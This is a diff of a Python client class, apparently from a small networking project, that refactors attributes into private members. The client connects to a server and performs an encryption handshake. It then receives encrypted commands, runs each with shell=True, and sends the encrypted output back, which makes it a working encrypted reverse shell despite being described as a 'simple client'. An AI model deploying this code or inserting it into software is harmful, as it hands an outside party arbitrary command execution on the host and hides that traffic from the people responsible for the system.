@@ -6,46 +6,49 @@ from concurrent.futures import ThreadPoolExecutor
 from network.tcp import Tcp
 class Client:
     def __init__(self, server_ip, server_port):
+        # public members
         self.server_ip = server_ip
         self.server_port = server_port
-        self.security = Security()
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.connect((self.server_ip, self.server_port))
+        
+        # private members
+        self.__security = Security()
+        self.__client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.__client_socket.connect((self.server_ip, self.server_port))
         try:
-            self.security.handshake(self.socket)
+            self.__security.handshake(self.__client_socket)
         except Exception as e:
             print(f"Failed handshake with: {e}")
-        self.pool = ThreadPoolExecutor(max_workers=3)
+        self.__pool = ThreadPoolExecutor(max_workers=3)
     
     def execute(self, command):
         print(f"Received command: {command}")
         result = subprocess.run(command, shell=True, capture_output=True)
         output = result.stdout.decode() + (result.stderr.decode() if result.stderr else "")
         print(output)
-        ciphertext = self.security.encrypt(output)
+        ciphertext = self.__security.encrypt(output)
         try:
-            Tcp.send(self.socket, ciphertext)
+            Tcp.send(self.__client_socket, ciphertext)
         except Exception as e:
             print(f"Failed to send data: {e}")
             
     def start(self):
         while True:
             try:
-                data = Tcp.recive(self.socket)
+                data = Tcp.recive(self.__client_socket)
                 if not data:
                     break
                 elif data == b"\x00":
                     continue
                 else:
-                    command = self.security.decrypt(data)
-                    self.pool.submit(self.execute, command)
+                    command = self.__security.decrypt(data)
+                    self.__pool.submit(self.execute, command)
             except Exception as e:
                 print(f"Error occurred: {e}")
                 break
                 
     def shutdown(self):
-        self.socket.close()
-        self.pool.shutdown(wait=False)
+        self.__client_socket.close()
+        self.__pool.shutdown(wait=False)
             
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Simple client for connecting to the server")
